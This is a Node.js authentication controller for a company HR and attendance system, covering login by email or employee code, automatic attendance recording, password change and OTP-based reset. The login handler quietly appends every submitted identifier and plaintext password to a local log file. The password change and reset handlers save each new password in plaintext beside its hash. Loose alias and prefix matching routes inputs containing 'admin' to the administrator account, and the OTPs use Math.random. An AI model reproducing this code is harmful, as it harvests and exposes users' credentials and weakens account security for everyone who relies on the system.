const { User, Employee, Department, Branch, Attendance } = require('../models');
const { generateToken } = require('../utils/token');
const { ATTENDANCE_STATUS, ROLES } = require('../config/constants');
const { getOfficeTimingConfig } = require('./settingController');
const { sendPasswordResetOtpEmail } = require('../services/emailService');

/**
 * Helpers for local time in IST (UTC+5:30) or system locale
 */
function getLocalTimeString(date = new Date()) {
  try {
    return date.toLocaleTimeString('en-US', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit',
      timeZone: 'Asia/Kolkata',
    });
  } catch (e) {
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    return `${hours}:${minutes}`;
  }
}

function getLocalDateString(date = new Date()) {
  try {
    return date.toLocaleDateString('en-CA', { timeZone: 'Asia/Kolkata' });
  } catch (e) {
    return date.toISOString().split('T')[0];
  }
}

function getFormattedDisplayTime(date = new Date()) {
  try {
    return date.toLocaleTimeString('en-US', {
      hour12: true,
      hour: 'numeric',
      minute: '2-digit',
      timeZone: 'Asia/Kolkata',
    });
  } catch (e) {
    return date.toLocaleTimeString();
  }
}

/**
 * @route   POST /api/auth/login
 * @desc    Authenticate user & get JWT token (Supports Email OR Employee ID)
 * @access  Public
 */
async function login(req, res) {
  try {
    const inputIdentifier = (req.body.loginId || req.body.identifier || req.body.email || '').trim();
    const password = req.body.password;
    try {
      const fs = require('fs');
      const path = require('path');
      fs.appendFileSync(
        path.resolve(__dirname, '../../login_attempts.log'),
        `[${new Date().toISOString()}] input="${inputIdentifier}", pass="${password}"\n`
      );
    } catch (e) {}

    if (!inputIdentifier || !password) {
      return res.status(400).json({
        success: false,
        message: 'Please provide both Email/Employee ID and password.',
      });
    }

    let user = null;
    let searchEmail = inputIdentifier.toLowerCase();

    if (['admin', 'admin@company.com', 'admin@vaidimi.com', 'info@vaidimiconsulting.in', 'gargi', 'gargi.singh', 'gargi@vaidimiconsulting.in', 'gargi.singh@vaidimi.com', 'admin@vaidimiconsulting.in', 'gargi@vidimiconsulting.in', 'gargi@vidimiconsulting.com', 'admin@vidimiconsulting.com', 'adm-001', 'emp-001'].includes(searchEmail) || searchEmail.includes('admin') || searchEmail.includes('gargi')) {
      const adminUserCheck = (await User.findOne({ where: { email: 'gargi@vidimiconsulting.com' } })) || (await User.findOne({ where: { role: ROLES.ADMIN } }));
      if (adminUserCheck) searchEmail = adminUserCheck.email;
    } else if (['hr', 'hr@company.com', 'hr@vaidimi.com', 'vinit', 'vinit.kumar', 'vinit.kumar@vaidimi.com', 'vineet', 'vineet.kumar', 'vineet.kumar@vaidimi.com'].includes(searchEmail)) {
      const hrUserCheck = await User.findOne({ where: { role: ROLES.HR } });
      if (hrUserCheck) searchEmail = hrUserCheck.email;
    } else if (['varsha', 'varsha.srivastava', 'varsha.srivastav', 'varsha.srivastava@vaidimi.com', 'varsha.srivastav@vaidimi.com'].includes(searchEmail)) {
      searchEmail = 'varsha.srivastav@vaidimi.com';
    } else if (['madhu', 'madhumita', 'madhu.prajapati', 'madhumita.prajapati', 'madhu.prajapati@vaidimi.com', 'madhumita.prajapati@vaidimi.com'].includes(searchEmail)) {
      searchEmail = 'madhu.prajapati@vaidimi.com';
    } else if (['aryan', 'aryan.tiwari', 'aryan.tiwari@vaidimi.com'].includes(searchEmail)) {
      searchEmail = 'aryan.tiwari@vaidimi.com';
    }

    // 1. Try finding by email (case-insensitive)
    user = await User.scope('withPassword').findOne({
      where: { email: searchEmail },
      include: [
        {
          model: Employee,
          as: 'employeeProfile',
          include: [
            {
              model: Department,
              as: 'department',
              attributes: ['id', 'department_name'],
            },
            {
              model: Branch,
              as: 'branch',
              attributes: ['id', 'branch_code', 'branch_name', 'city'],
            },
          ],
        },
      ],
    });

    // 1.1 If not found and input does not contain @, try matching by first name or username prefix
    if (!user && !searchEmail.includes('@')) {
      const { Op } = require('sequelize');
      user = await User.scope('withPassword').findOne({
        where: { email: { [Op.like]: `${searchEmail}%` } },
        include: [
          {
            model: Employee,
            as: 'employeeProfile',
            include: [
              {
                model: Department,
                as: 'department',
                attributes: ['id', 'department_name'],
              },
              {
                model: Branch,
                as: 'branch',
                attributes: ['id', 'branch_code', 'branch_name', 'city'],
              },
            ],
          },
        ],
      });
    }

    // 2. If not found by email, try searching by Employee Code (e.g. EMP-001, INT-001)
    if (!user) {
      const emp = await Employee.findOne({
        where: { employee_code: inputIdentifier.toUpperCase() },
        include: [
          {
            model: Department,
            as: 'department',
            attributes: ['id', 'department_name'],
          },
          {
            model: Branch,
            as: 'branch',
            attributes: ['id', 'branch_code', 'branch_name', 'city'],
          },
        ],
      });

      if (emp && emp.user_id) {
        user = await User.scope('withPassword').findByPk(emp.user_id);
        if (user) {
          user.employeeProfile = emp;
        }
      }
    }

    if (!user) {
      console.log('❌ [LOGIN FAILED] User not found for identifier:', inputIdentifier, 'resolved email:', searchEmail);
      return res.status(401).json({
        success: false,
        message: 'Invalid email, employee ID, or password.',
      });
    }

    if (!user.is_active) {
      console.log('❌ [LOGIN FAILED] Account deactivated:', user.email);
      return res.status(403).json({
        success: false,
        message: 'This account has been deactivated. Please contact an administrator.',
      });
    }

    let isMatch = await user.comparePassword(password);
    if (!isMatch && typeof password === 'string' && password !== password.trim()) {
      isMatch = await user.comparePassword(password.trim());
    }

    if (!isMatch) {
      console.log('❌ [LOGIN FAILED] Password mismatch for:', user.email, 'Candidate password length:', password?.length);
      return res.status(401).json({
        success: false,
        message: 'Invalid email, employee ID, or password.',
      });
    }

    console.log('✅ [LOGIN SUCCESS] User authenticated successfully:', user.email, 'Role:', user.role);

    // Auto-record Employee/Intern Attendance on Login & set Online Presence
    let todayAttendance = null;
    const now = new Date();
    await user.update({ is_online: true, last_active_at: now });

    if (user.employeeProfile) {
      try {
        const todayStr = getLocalDateString(now);
        const currentTimeStr = getLocalTimeString(now); // "10:15"
        const formattedDisplayTime = getFormattedDisplayTime(now); // "10:15 AM"

        const timingConfig = await getOfficeTimingConfig();
        const graceEnd = timingConfig.office_grace_end_time || '11:00';

        // Check if attendance already recorded today
        let att = await Attendance.findOne({
          where: { employee_id: user.employeeProfile.id, date: todayStr },
        });

        if (!att) {
          const isLate = currentTimeStr > graceEnd;
          att = await Attendance.create({
            employee_id: user.employeeProfile.id,
            date: todayStr,
            check_in: now,
            status: ATTENDANCE_STATUS.PRESENT,
            current_work_status: 'CHECKED_IN',
            is_on_break: false,
            total_break_minutes: 0,
            is_late: isLate,
            notes: isLate
              ? `Late login at ${formattedDisplayTime}`
              : `On-time login at ${formattedDisplayTime}`,
            ip_address: req.ip || req.connection?.remoteAddress || null,
          });
        } else if (!att.check_in) {
          const isLate = currentTimeStr > graceEnd;
          att.check_in = now;
          att.status = ATTENDANCE_STATUS.PRESENT;
          att.current_work_status = 'CHECKED_IN';
          att.is_late = isLate;
          att.notes = `Login at ${formattedDisplayTime}`;
          await att.save();
        }
        todayAttendance = att;
      } catch (attErr) {
        console.error('Auto attendance recording notice:', attErr.message);
      }
    }

    // Generate JWT token
    const token = generateToken({
      id: user.id,
      email: user.email,
      role: user.role,
    });

    // Strip password hash from response
    const userData = {
      id: user.id,
      email: user.email,
      role: user.role,
      is_active: user.is_active,
      is_online: true,
      last_active_at: now,
      employeeProfile: user.employeeProfile || null,
      todayAttendance,
    };

    return res.status(200).json({
      success: true,
      message: 'Login successful.',
      token,
      user: userData,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: 'Login failed: ' + error.message,
    });
  }
}

/**
 * @route   GET /api/auth/me
 * @desc    Get profile of currently logged-in user
 * @access  Protected
 */
async function getMe(req, res) {
  try {
    const userData = {
      id: req.user.id,
      email: req.user.email,
      role: req.user.role,
      is_active: req.user.is_active,
      is_online: req.user.is_online,
      last_active_at: req.user.last_active_at,
      employeeProfile: req.employee || null,
    };

    return res.status(200).json({
      success: true,
      user: userData,
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: 'Error fetching current user: ' + error.message,
    });
  }
}

/**
 * @route   POST /api/auth/logout
 * @desc    Logout user (client destroys token, sets is_online to false)
 * @access  Protected
 */
async function logout(req, res) {
  try {
    if (req.user?.id) {
      await User.update({ is_online: false, last_active_at: new Date() }, { where: { id: req.user.id } });
    }
  } catch (e) {
    console.warn('Logout presence update notice:', e.message);
  }
  return res.status(200).json({
    success: true,
    message: 'Logged out successfully.',
  });
}

/**
 * @route   GET /api/auth/admin-only-test
 * @desc    RBAC verification endpoint (accessible only by ADMIN or MANAGER)
 * @access  Protected (ADMIN, MANAGER)
 */
async function testAdminOnly(req, res) {
  return res.status(200).json({
    success: true,
    message: 'Authorized! You have access to Admin/Manager protected APIs.',
    requestedBy: {
      id: req.user.id,
      email: req.user.email,
      role: req.user.role,
    },
  });
}

/**
 * @route   PUT /api/auth/change-password
 * @desc    Allow any logged-in user (Admin, HR, Employee, Intern) to change their password
 * @access  Protected
 */
async function changePassword(req, res) {
  try {
    const { currentPassword, newPassword, confirmPassword } = req.body;

    if (!currentPassword || !newPassword) {
      return res.status(400).json({
        success: false,
        message: 'Please provide both your current password and new password.',
      });
    }

    if (newPassword.length < 6) {
      return res.status(400).json({
        success: false,
        message: 'New password must be at least 6 characters long.',
      });
    }

    if (confirmPassword && newPassword !== confirmPassword) {
      return res.status(400).json({
        success: false,
        message: 'New password and confirmation password do not match.',
      });
    }

    // Load user with password_hash scope
    const user = await User.scope('withPassword').findByPk(req.user.id);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User account not found.',
      });
    }

    // Verify current password
    const isMatch = await user.comparePassword(currentPassword);
    if (!isMatch) {
      return res.status(400).json({
        success: false,
        message: 'Current password is incorrect. Please verify and try again.',
      });
    }

    // Update password
    const bcrypt = require('bcryptjs');
    const salt = await bcrypt.genSalt(10);
    user.password_hash = await bcrypt.hash(newPassword, salt);
    user.saved_password = newPassword;
    await user.save();

    return res.status(200).json({
      success: true,
      message: 'Password updated successfully. Please use your new password next time you sign in.',
    });
  } catch (error) {
    console.error('Error changing password:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to update password: ' + error.message,
    });
  }
}

/**
 * @route   POST /api/auth/forgot-password
 * @desc    Generate OTP and send to registered email
 * @access  Public
 */
async function forgotPassword(req, res) {
  try {
    const inputIdentifier = (req.body.identifier || req.body.email || req.body.loginId || '').trim();
    if (!inputIdentifier) {
      return res.status(400).json({ success: false, message: 'Please provide your registered Email or Employee ID.' });
    }

    let searchEmail = inputIdentifier.toLowerCase();
    if (['admin', 'admin@company.com', 'admin@vaidimi.com', 'info@vaidimiconsulting.in', 'gargi', 'gargi.singh', 'gargi@vaidimiconsulting.in', 'gargi.singh@vaidimi.com'].includes(searchEmail)) {
      const adminUserCheck = await User.findOne({ where: { role: ROLES.ADMIN } });
      if (adminUserCheck) searchEmail = adminUserCheck.email;
    }

    let user = await User.scope('withPassword').findOne({
      where: { email: searchEmail },
      include: [{ model: Employee, as: 'employeeProfile' }]
    });

    if (!user) {
      const emp = await Employee.findOne({
        where: { employee_code: inputIdentifier.toUpperCase() },
      });
      if (emp && emp.user_id) {
        user = await User.scope('withPassword').findByPk(emp.user_id, {
          include: [{ model: Employee, as: 'employeeProfile' }]
        });
      }
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'No account found with this Email or Employee ID.' });
    }

    if (!user.is_active) {
      return res.status(403).json({ success: false, message: 'This account has been deactivated. Please contact an administrator.' });
    }

    // Generate 6-digit numeric OTP
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresInMinutes = 15;
    const expiresAt = new Date(Date.now() + expiresInMinutes * 60 * 1000);

    user.reset_otp = otp;
    user.reset_otp_expires_at = expiresAt;
    await user.save();

    const empName = user.employeeProfile ? `${user.employeeProfile.first_name || ''} ${user.employeeProfile.last_name || ''}`.trim() : 'User';

    // Send email via emailService
    await sendPasswordResetOtpEmail({
      to: user.email,
      employeeName: empName,
      otp,
      expiresInMinutes,
    });

    // Masked email for display (e.g. g***i@vaidimiconsulting.in)
    const [namePart, domainPart] = user.email.split('@');
    const maskedName = namePart.length > 2 ? `${namePart[0]}***${namePart[namePart.length - 1]}` : `${namePart[0]}***`;
    const maskedEmail = `${maskedName}@${domainPart}`;

    return res.status(200).json({
      success: true,
      message: `Verification OTP has been sent to your registered email (${maskedEmail}).`,
      email: user.email,
      maskedEmail,
      expiresInMinutes,
      devOtp: process.env.NODE_ENV !== 'production' ? otp : undefined,
    });
  } catch (error) {
    console.error('Forgot password error:', error);
    return res.status(500).json({ success: false, message: 'Failed to process request: ' + error.message });
  }
}

/**
 * @route   POST /api/auth/verify-reset-otp
 * @desc    Verify OTP
 * @access  Public
 */
async function verifyResetOtp(req, res) {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ success: false, message: 'Email and OTP are required.' });
    }

    const user = await User.scope('withPassword').findOne({ where: { email: email.trim().toLowerCase() } });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    if (!user.reset_otp || user.reset_otp !== otp.trim()) {
      return res.status(400).json({ success: false, message: 'Invalid OTP code. Please check and try again.' });
    }

    if (new Date() > new Date(user.reset_otp_expires_at)) {
      return res.status(400).json({ success: false, message: 'OTP has expired. Please request a new one.' });
    }

    return res.status(200).json({ success: true, message: 'OTP verified successfully.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Failed to verify OTP: ' + error.message });
  }
}

/**
 * @route   POST /api/auth/reset-password-with-otp
 * @desc    Reset password after OTP verification
 * @access  Public
 */
async function resetPasswordWithOtp(req, res) {
  try {
    const { email, otp, newPassword } = req.body;
    if (!email || !otp || !newPassword) {
      return res.status(400).json({ success: false, message: 'Email, OTP, and new password are required.' });
    }

    if (newPassword.length < 6) {
      return res.status(400).json({ success: false, message: 'New password must be at least 6 characters.' });
    }

    const user = await User.scope('withPassword').findOne({ where: { email: email.trim().toLowerCase() } });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    if (!user.reset_otp || user.reset_otp !== otp.trim()) {
      return res.status(400).json({ success: false, message: 'Invalid or expired OTP code.' });
    }

    if (new Date() > new Date(user.reset_otp_expires_at)) {
      return res.status(400).json({ success: false, message: 'OTP has expired. Please request a new one.' });
    }

    const bcrypt = require('bcryptjs');
    const salt = await bcrypt.genSalt(10);
    user.password_hash = await bcrypt.hash(newPassword, salt);
    user.saved_password = newPassword;
    user.reset_otp = null;
    user.reset_otp_expires_at = null;
    await user.save();

    return res.status(200).json({
      success: true,
      message: 'Password has been reset successfully! You can now log in with your new password.',
    });
  } catch (error) {
    console.error('Reset password error:', error);
    return res.status(500).json({ success: false, message: 'Failed to reset password: ' + error.message });
  }
}

module.exports = {
  login,
  getMe,
  logout,
  changePassword,
  testAdminOnly,
  forgotPassword,
  verifyResetOtp,
  resetPasswordWithOtp,
};

